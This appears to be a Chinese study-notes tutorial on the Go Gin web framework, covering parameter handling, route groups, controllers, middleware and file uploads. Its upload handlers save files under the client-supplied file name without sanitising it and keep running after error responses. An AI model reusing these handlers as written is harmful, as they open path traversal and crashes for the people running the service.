r.GET(<span class="hljs-string">&quot;/html&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
  
   c.HTML(http.StatusOK, <span class="hljs-string">&quot;index.html&quot;</span>, gin.H&#123;  
      <span class="hljs-string">&quot;title&quot;</span> : <span class="hljs-string">&quot;我是后台数据&quot;</span>,  <span class="hljs-comment">// 使用gin.H可以向前端模板传值</span>
   &#125;)  
&#125;)
</code></pre>


<h1 id="传值操作"><a href="#传值操作" class="headerlink" title="传值操作"></a>传值操作</h1><h2 id="get方法"><a href="#get方法" class="headerlink" title="get方法"></a>get方法</h2><pre><code class="hljs go"><span class="hljs-comment">// get 传值  </span>
r.GET(<span class="hljs-string">&quot;/get&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
   username := c.Query(<span class="hljs-string">&quot;username&quot;</span>)  
   password := c.Query(<span class="hljs-string">&quot;password&quot;</span>)  
   <span class="hljs-comment">// 当值为空时 赋默认值</span>
   sex := c.DefaultQuery(<span class="hljs-string">&quot;sex&quot;</span>, <span class="hljs-string">&quot;man&quot;</span>)  
  
   c.String(http.StatusOK, username + password + sex)  
  
&#125;)</code></pre>

<h2 id="post方法"><a href="#post方法" class="headerlink" title="post方法"></a>post方法</h2><pre><code class="hljs go"><span class="hljs-comment">// post 传值  </span>
r.POST(    <span class="hljs-string">&quot;/post&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
   username := c.PostForm(<span class="hljs-string">&quot;username&quot;</span>)  
   password := c.PostForm(<span class="hljs-string">&quot;password&quot;</span>)  
   sex := c.DefaultPostForm(<span class="hljs-string">&quot;sex&quot;</span>, <span class="hljs-string">&quot;man&quot;</span>)  
  
   c.String(http.StatusOK, username + password + sex)  
  
&#125;)</code></pre>

<h2 id="将请求参数绑定到结构体"><a href="#将请求参数绑定到结构体" class="headerlink" title="将请求参数绑定到结构体"></a>将请求参数绑定到结构体</h2><pre><code class="hljs go"><span class="hljs-comment">// 请求参数绑定到结构体  </span>
r.GET(<span class="hljs-string">&quot;/getUser&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
   user := &amp;UserInfo&#123;&#125;  
   err := c.ShouldBind(user)  
   <span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span>&#123;  
      c.JSON(http.StatusOK, user)  
   &#125;<span class="hljs-keyword">else</span> &#123;  
      c.JSON(http.StatusOK, gin.H&#123;  
         <span class="hljs-string">&quot;code&quot;</span> : <span class="hljs-number">200</span>,  
         <span class="hljs-string">&quot;msg&quot;</span> : err.Error(),  
      &#125;)  
   &#125;  
&#125;)</code></pre>

<h2 id="动态路由传值-Restful"><a href="#动态路由传值-Restful" class="headerlink" title="动态路由传值(Restful)"></a>动态路由传值(Restful)</h2><pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/user/:uid&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
   uid:= c.Param(<span class="hljs-string">&quot;uid&quot;</span>)  
   c.JSON(http.StatusOK, gin.H&#123;  
      <span class="hljs-string">&quot;msg&quot;</span> : uid,  
   &#125;)  
&#125;)</code></pre>


<h1 id="路由分组"><a href="#路由分组" class="headerlink" title="路由分组"></a>路由分组</h1><pre><code class="hljs go">defaultRouter := r.Group(<span class="hljs-string">&quot;/&quot;</span>)  <span class="hljs-comment">// 关键点</span>
&#123;  
   defaultRouter.GET(<span class="hljs-string">&quot;/index&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
      c.JSON(http.StatusOK, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;首页&quot;</span>,  
      &#125;)  
   &#125;)  
  
   defaultRouter.GET(<span class="hljs-string">&quot;/news&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
      c.JSON(http.StatusOK, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;新闻列表&quot;</span>,  
      &#125;)  
   &#125;)  
  
   defaultRouter.GET(<span class="hljs-string">&quot;/users&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
      c.JSON(http.StatusOK, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;用户列表&quot;</span>,  
      &#125;)  
   &#125;)  
&#125;  
apiRouter := r.Group(<span class="hljs-string">&quot;/api&quot;</span>)  
&#123;  
   apiRouter.GET(<span class="hljs-string">&quot;/user&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
      c.JSON(http.StatusOK, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;api接口&quot;</span>,  
      &#125;)  
   &#125;)  
  
   apiRouter.GET(<span class="hljs-string">&quot;/news&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
      c.JSON(http.StatusOK, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;api接口2&quot;</span>,  
      &#125;)  
   &#125;)  
  
   apiRouter.GET(<span class="hljs-string">&quot;/admin&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
      c.JSON(http.StatusOK, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;api接口3&quot;</span>,  
      &#125;)  
   &#125;)  
&#125;  
  
  
adminRouter := r.Group(<span class="hljs-string">&quot;/admin&quot;</span>)  
&#123;  
   adminRouter.GET(<span class="hljs-string">&quot;/index&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
      c.JSON(http.StatusOK, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;admin后台&quot;</span>,  
      &#125;)  
   &#125;)  
  
   adminRouter.GET(<span class="hljs-string">&quot;/login&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
      c.JSON(http.StatusOK, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;admin后台登录&quot;</span>,  
      &#125;)  
   &#125;)  
&#125;</code></pre>


<h1 id="路由抽离"><a href="#路由抽离" class="headerlink" title="路由抽离"></a>路由抽离</h1><p>将路由分组的过程封装成单独的函数即可</p>
<p>例如</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> routers  
  
<span class="hljs-keyword">import</span> (  
   <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span>  
   <span class="hljs-string">&quot;net/http&quot;</span>)  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">DefaultRouter</span><span class="hljs-params">(r *gin.Engine)</span></span>&#123;  
   defaultRouter := r.Group(<span class="hljs-string">&quot;/&quot;</span>)  
   &#123;  
      defaultRouter.GET(<span class="hljs-string">&quot;/index&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
         c.JSON(http.StatusOK, gin.H&#123;  
            <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;首页&quot;</span>,  
         &#125;)  
      &#125;)  
  
      defaultRouter.GET(<span class="hljs-string">&quot;/news&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
         c.JSON(http.StatusOK, gin.H&#123;  
            <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;新闻列表&quot;</span>,  
         &#125;)  
      &#125;)  
  
      defaultRouter.GET(<span class="hljs-string">&quot;/users&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
         c.JSON(http.StatusOK, gin.H&#123;  
            <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;用户列表&quot;</span>,  
         &#125;)  
      &#125;)  
   &#125;  
&#125;</code></pre>

<p>在main.go中调用</p>
<h1 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h1><h2 id="抽离"><a href="#抽离" class="headerlink" title="抽离"></a>抽离</h2><p>就是将路由里的方法抽离出去 使用外部文件中创建的方法即可</p>
<p>首先创建controllers&#x2F;admin文件夹<br>创建userController</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> admin  
  
<span class="hljs-keyword">import</span> (  
   <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span>  
   <span class="hljs-string">&quot;net/http&quot;</span>)  


<span class="hljs-comment">// 创建对应的结构体 然后绑定对应的方法 可以简化开发步骤</span>
<span class="hljs-keyword">type</span> UserController <span class="hljs-keyword">struct</span> &#123;  
  
&#125;  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(con UserController)</span></span> Index(c *gin.Context) &#123;  
   c.JSON(http.StatusOK, gin.H&#123;  
      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;用户列表&quot;</span>,  
   &#125;)  
&#125;  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(con UserController)</span></span> Add(c *gin.Context) &#123;  
   c.JSON(http.StatusOK, gin.H&#123;  
      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;添加user&quot;</span>,  
   &#125;)  
&#125;  

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(con UserController)</span></span> Edit(c *gin.Context) &#123;  
   c.JSON(http.StatusOK, gin.H&#123;  
      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;修改user&quot;</span>,  
   &#125;)  
&#125;</code></pre>

<p>创建articleController</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> admin  
  
<span class="hljs-keyword">import</span> (  
   <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span>  
   <span class="hljs-string">&quot;net/http&quot;</span>)  
  
<span class="hljs-keyword">type</span> ArticleController <span class="hljs-keyword">struct</span> &#123;  
  
&#125;  
  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(con ArticleController)</span></span> Add(c *gin.Context) &#123;  
   c.JSON(http.StatusOK, gin.H&#123;  
      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;添加article&quot;</span>,  
   &#125;)  
&#125;  
  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(con ArticleController)</span></span> Edit(c *gin.Context) &#123;  
   c.JSON(http.StatusOK, gin.H&#123;  
      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;修改article&quot;</span>,  
   &#125;)  
&#125;</code></pre>

<p>在adminRouter中修改代码使用上面的Controller</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> routers  
<span class="hljs-keyword">import</span> (  
   <span class="hljs-string">&quot;gindemo2/controllers/admin&quot;</span>  
   <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span>   <span class="hljs-string">&quot;net/http&quot;</span>
)  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">AdminRouter</span><span class="hljs-params">(r *gin.Engine)</span></span>&#123;  
   adminRouter := r.Group(<span class="hljs-string">&quot;/admin&quot;</span>)  
   &#123;  
      adminRouter.GET(<span class="hljs-string">&quot;/index&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
         c.JSON(http.StatusOK, gin.H&#123;  
            <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;admin后台&quot;</span>,  
         &#125;)  
      &#125;)  
      adminRouter.GET(<span class="hljs-string">&quot;/user&quot;</span>, admin.UserController&#123;&#125;.Index)  
      adminRouter.GET(<span class="hljs-string">&quot;/user/add&quot;</span>, admin.UserController&#123;&#125;.Add)  
      adminRouter.GET(<span class="hljs-string">&quot;/user/edit&quot;</span>, admin.UserController&#123;&#125;.Edit)  
      adminRouter.GET(<span class="hljs-string">&quot;/article/add&quot;</span>, admin.ArticleController&#123;&#125;.Add)  
      adminRouter.GET(<span class="hljs-string">&quot;/article/edit&quot;</span>, admin.ArticleController&#123;&#125;.Edit)  
   &#125;  
&#125;</code></pre>

<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>创建baseController，这里可以写一些通用的处理函数</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> admin  
  
<span class="hljs-keyword">import</span> (  
   <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span>  
   <span class="hljs-string">&quot;net/http&quot;</span>)  
  
<span class="hljs-keyword">type</span> BaseController <span class="hljs-keyword">struct</span> &#123;  
  
&#125;  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(con BaseController)</span></span> Success(c *gin.Context) &#123;  
   c.JSON(http.StatusOK, gin.H&#123;  
      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,  
   &#125;)  
&#125;  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(con BaseController)</span></span> Error(c *gin.Context) &#123;  
   c.JSON(http.StatusOK, gin.H&#123;  
      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>,  
   &#125;)  
&#125;
</code></pre>

<p>userController继承baseController中方法</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> admin  
  
<span class="hljs-keyword">import</span> (  
   <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span>  
   <span class="hljs-string">&quot;net/http&quot;</span>)  
  
<span class="hljs-keyword">type</span> UserController <span class="hljs-keyword">struct</span> &#123;  
   BaseController  <span class="hljs-comment">// 继承baseController</span>
&#125;</code></pre>

<p>userController可以直接使用baseController中的方法</p>
<h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>![[Pasted image 20221207215236.png]]<br>如图gin.GET方法的第二个参数是可变参数类型，可以放多个回调函数，最后一个回调函数是controller，前面的则作为中间件，可作为拦截器、日志记录、执行时间统计<br>可直接</p>
<pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;  
   fmt.Println(<span class="hljs-string">&quot;aaaaa&quot;</span>)  <span class="hljs-comment">// 中间件</span>
&#125;, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
   c.String(http.StatusOK, <span class="hljs-string">&quot;搭建完成&quot;</span>)  
&#125;)</code></pre>

<p>也可将函数封装后调用</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">initMiddleWare</span><span class="hljs-params">(c *gin.Context)</span></span>&#123;  
   fmt.Println(<span class="hljs-string">&quot;aaaa&quot;</span>)  
&#125;

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;
... 
r.GET(<span class="hljs-string">&quot;/hello&quot;</span>, initMiddleWare,<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
   c.String(http.StatusOK, <span class="hljs-string">&quot;hello,gin111&quot;</span>)  
&#125;)
...
&#125;
</code></pre>


<h2 id="c-Next"><a href="#c-Next" class="headerlink" title="c.Next()"></a>c.Next()</h2><p>调用Next()，会执行中间件后的回调函数</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">initMiddleWare</span><span class="hljs-params">(c *gin.Context)</span></span>&#123;  
   fmt.Println(<span class="hljs-string">&quot;This is a middleware1...&quot;</span>)  
   c.Next()  
   fmt.Println(<span class="hljs-string">&quot;This is a middleware2...&quot;</span>)  
&#125;


r.GET(<span class="hljs-string">&quot;/hello&quot;</span>, initMiddleWare,<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
   fmt.Println(<span class="hljs-string">&quot;This is index...&quot;</span>)  
   c.String(http.StatusOK, <span class="hljs-string">&quot;hello,gin111&quot;</span>)  
&#125;)</code></pre>

<p>执行结果</p>
<pre><code class="hljs apache"><span class="hljs-attribute">22</span>:<span class="hljs-number">5</span>:<span class="hljs-number">29</span> app         | This is a middleware1...
<span class="hljs-attribute">22</span>:<span class="hljs-number">5</span>:<span class="hljs-number">29</span> app         | This is index...
<span class="hljs-attribute">22</span>:<span class="hljs-number">5</span>:<span class="hljs-number">29</span> app         | This is a middleware2...</code></pre>


<h2 id="c-Abort"><a href="#c-Abort" class="headerlink" title="c.Abort()"></a>c.Abort()</h2><p>表示终止调用该请求的剩余处理程序，即会终止中间后的回调函数，但是该中间件中的处理继续完成</p>
<h2 id="多个中间件的执行顺序"><a href="#多个中间件的执行顺序" class="headerlink" title="多个中间件的执行顺序"></a>多个中间件的执行顺序</h2><p>与SpringBoot中的拦截器的执行顺序一样<br>定义两个中间件</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">initMiddleWare1</span><span class="hljs-params">(c *gin.Context)</span></span>&#123;  
   fmt.Println(<span class="hljs-string">&quot;This is a middleware1-1...&quot;</span>)  
   c.Next()  
   fmt.Println(<span class="hljs-string">&quot;This is a middleware1-2...&quot;</span>)  
&#125;  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">initMiddleWare2</span><span class="hljs-params">(c *gin.Context)</span></span>&#123;  
   fmt.Println(<span class="hljs-string">&quot;This is a middleware2-1...&quot;</span>)  
   c.Next()  
   fmt.Println(<span class="hljs-string">&quot;This is a middleware2-2...&quot;</span>)  
&#125;</code></pre>

<p>在路由中添加中间件</p>
<pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/hello&quot;</span>, initMiddleWare1,initMiddleWare2, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  
   fmt.Println(<span class="hljs-string">&quot;This is index...&quot;</span>)  
   c.String(http.StatusOK, <span class="hljs-string">&quot;hello,gin111&quot;</span>)  
&#125;)</code></pre>

<p>执行顺序</p>
<pre><code class="hljs mercury"><span class="hljs-number">22</span>:<span class="hljs-number">13</span>:<span class="hljs-number">17</span> app         | This <span class="hljs-keyword">is</span> a middleware1-<span class="hljs-number">1</span>...
<span class="hljs-number">22</span>:<span class="hljs-number">13</span>:<span class="hljs-number">17</span> app         | This <span class="hljs-keyword">is</span> a middleware2-<span class="hljs-number">1</span>...
This <span class="hljs-keyword">is</span> index...
This <span class="hljs-keyword">is</span> a middleware2-<span class="hljs-number">2</span>...
This <span class="hljs-keyword">is</span> a middleware1-<span class="hljs-number">2</span>...</code></pre>

<h2 id="全局中间件"><a href="#全局中间件" class="headerlink" title="全局中间件"></a>全局中间件</h2><p>使用r.Use即可添加全局中间件，并且可以添加多个</p>
<pre><code class="hljs reasonml">r.<span class="hljs-constructor">Use(<span class="hljs-params">initMiddleWare</span>)</span></code></pre>

<h2 id="路由分组添加全局中间件"><a href="#路由分组添加全局中间件" class="headerlink" title="路由分组添加全局中间件"></a>路由分组添加全局中间件</h2><p>使用Use函数</p>
<pre><code class="hljs css">adminRouter := r.<span class="hljs-built_in">Group</span>(<span class="hljs-string">&quot;/admin&quot;</span>)  
adminRouter.<span class="hljs-built_in">Use</span>(intMiddleWare)</code></pre>

<p>或者直接添加</p>
<pre><code class="hljs css">adminRouter := r.<span class="hljs-built_in">Group</span>(<span class="hljs-string">&quot;/admin&quot;</span>, intMiddleWare)</code></pre>

<h2 id="中间件与控制器之间共享数据"><a href="#中间件与控制器之间共享数据" class="headerlink" title="中间件与控制器之间共享数据"></a>中间件与控制器之间共享数据</h2><p>使用Set 和 Get，只能在一个页面中共享数据<br>中间件中使用c.Set函数传递值</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitMiddleWare</span><span class="hljs-params">(c *gin.Context)</span></span>&#123;  
  
   <span class="hljs-comment">//可以作为用户登录的拦截器  </span>
   fmt.Println(c.Request.URL)  
  
   c.Set(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;zhangsan&quot;</span>)  
&#125;</code></pre>

<p>控制器中使用c.Get获取中间件传的值</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(con UserController)</span></span> Index(c *gin.Context) &#123;  
  
   username, exists := c.Get(<span class="hljs-string">&quot;username&quot;</span>)  
   <span class="hljs-keyword">if</span> exists&#123;  
      fmt.Println(username)  
   &#125;  
   c.JSON(http.StatusOK, gin.H&#123;  
      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;用户列表&quot;</span>,  
   &#125;)  
&#125;</code></pre>

<p>![[Pasted image 20221207223132.png]]</p>
<p>Get返回的类型为空接口，使用时主要用类型断言</p>
<h2 id="中间件使用goroutine"><a href="#中间件使用goroutine" class="headerlink" title="中间件使用goroutine"></a>中间件使用goroutine</h2><p>当在中间件或 handler 中启动新的 goroutine 时，不能使用原始的上下文 (c *gin.Context)必须使用其只读副本 (c.Copy())</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitMiddleWare</span><span class="hljs-params">(c *gin.Context)</span></span>&#123;  
  
   <span class="hljs-comment">//可以作为用户登录的拦截器  </span>
   fmt.Println(c.Request.URL)  
  
   c.Set(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;zhangsan&quot;</span>)  
  
   <span class="hljs-comment">// 定义一个gotoutine 统计日志  </span>
   context:= c.Copy()  
   <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  
      time.Sleep(<span class="hljs-number">2</span> * time.Second)  
      fmt.Println(<span class="hljs-string">&quot;Done! in path :&quot;</span>  + context.Request.URL.Path )  
   &#125;()  
&#125;</code></pre>


<h1 id="model"><a href="#model" class="headerlink" title="model"></a>model</h1><p>可以在model 中定义一些公用的函数，这样可以在routers和controllers中共同使用<br>在model中定义的函数的名称首字母需要大写，但是在java中这种就叫做工具类啊，直接放在utils包即可，model不是应该跟数据库绑定的吗？？？有点不理解</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> models  
  
<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;time&quot;</span>  
  
<span class="hljs-comment">//时间戳转日期  </span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">UnixToTime</span><span class="hljs-params">(timestamp <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">string</span>&#123;  
   t := time.Unix(<span class="hljs-type">int64</span>(timestamp), <span class="hljs-number">0</span>)  
   <span class="hljs-keyword">return</span> t.Format(<span class="hljs-string">&quot;2006-01-02 15:04:05&quot;</span>)  
&#125;  
  
  
<span class="hljs-comment">// 获取时间戳  </span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetUnix</span><span class="hljs-params">()</span></span> <span class="hljs-type">int64</span>&#123;  
   <span class="hljs-keyword">return</span> time.Now().Unix()  
&#125;  
<span class="hljs-comment">// 获取当前日期  </span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetDate</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span>&#123;  
   templete := <span class="hljs-string">&quot;2006-01-02 15:04:05&quot;</span>  
   <span class="hljs-keyword">return</span> time.Now().Format(templete)  
&#125;  
<span class="hljs-comment">// 获取年月日  </span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetDay</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span>&#123;  
   template := <span class="hljs-string">&quot;20060102&quot;</span>  
   <span class="hljs-keyword">return</span> time.Now().Format(template)  
&#125;</code></pre>

<h1 id="Gin文件上传"><a href="#Gin文件上传" class="headerlink" title="Gin文件上传"></a>Gin文件上传</h1><h2 id="单个文件上传"><a href="#单个文件上传" class="headerlink" title="单个文件上传"></a>单个文件上传</h2><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(con UserController)</span></span> Upload(c *gin.Context) &#123;  
   username := c.PostForm(<span class="hljs-string">&quot;username&quot;</span>)  
   file, err := c.FormFile(<span class="hljs-string">&quot;file&quot;</span>)  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span>&#123;  
      c.JSON(http.StatusBadRequest, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload error:&quot;</span> + err.Error(),  
      &#125;)  
   &#125;  
   fmt.Println(file.Filename)  
   fmt.Println(username)  
	<span class="hljs-comment">// 第二个参数 为文件保存地址</span>
   err = c.SaveUploadedFile(file, <span class="hljs-string">&quot;./upload/&quot;</span> + file.Filename)  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span>&#123;  
      c.JSON(http.StatusBadRequest, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload error:&quot;</span> + err.Error(),  
      &#125;)  
   &#125;  
   c.JSON(http.StatusOK, gin.H&#123;  
      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload success&quot;</span>,  
   &#125;)  
&#125;</code></pre>

<h2 id="多个文件上传"><a href="#多个文件上传" class="headerlink" title="多个文件上传"></a>多个文件上传</h2><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><p>采用单文件上传的方式处理多文件</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(con UserController)</span></span> Uploads1(c *gin.Context) &#123;  
   username := c.PostForm(<span class="hljs-string">&quot;username&quot;</span>)  
  
   dst := <span class="hljs-string">&quot;./upload/&quot;</span>  
   file1, err := c.FormFile(<span class="hljs-string">&quot;file1&quot;</span>)  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span>&#123;  
      c.JSON(http.StatusBadRequest, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload error:&quot;</span> + err.Error(),  
      &#125;)  
   &#125;  
   err = c.SaveUploadedFile(file1, dst + file1.Filename)  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span>&#123;  
      c.JSON(http.StatusBadRequest, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload error:&quot;</span> + err.Error(),  
      &#125;)  
   &#125;  
  
   file2, err := c.FormFile(<span class="hljs-string">&quot;file2&quot;</span>)  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span>&#123;  
      c.JSON(http.StatusBadRequest, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload error:&quot;</span> + err.Error(),  
      &#125;)  
   &#125;  
   err = c.SaveUploadedFile(file2, dst + file2.Filename)  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span>&#123;  
      c.JSON(http.StatusBadRequest, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload error:&quot;</span> + err.Error(),  
      &#125;)  
   &#125;  
   c.JSON(http.StatusOK, gin.H&#123;  
      <span class="hljs-string">&quot;username&quot;</span>: username,  
      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload success&quot;</span>,  
   &#125;)  
&#125;</code></pre>

<h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><p>使用range遍历</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(con UserController)</span></span> Uploads2(c *gin.Context) &#123;  
   username := c.PostForm(<span class="hljs-string">&quot;username&quot;</span>)  
   dst := <span class="hljs-string">&quot;./upload/&quot;</span>  
  
   form, err := c.MultipartForm()  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span>&#123;  
      c.JSON(http.StatusBadRequest, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload error:&quot;</span> + err.Error(),  
      &#125;)  
   &#125;  
   files := form.File[<span class="hljs-string">&quot;file[]&quot;</span>]  
  
   <span class="hljs-keyword">for</span> _, file := <span class="hljs-keyword">range</span> files&#123;  
      err = c.SaveUploadedFile(file, dst + file.Filename)  
      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span>&#123;  
         c.JSON(http.StatusBadRequest, gin.H&#123;  
            <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload error:&quot;</span> + err.Error(),  
         &#125;)  
      &#125;  
   &#125;  
  
   c.JSON(http.StatusOK, gin.H&#123;  
      <span class="hljs-string">&quot;username&quot;</span>: username,  
      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload success&quot;</span>,  
   &#125;)  
&#125;</code></pre>

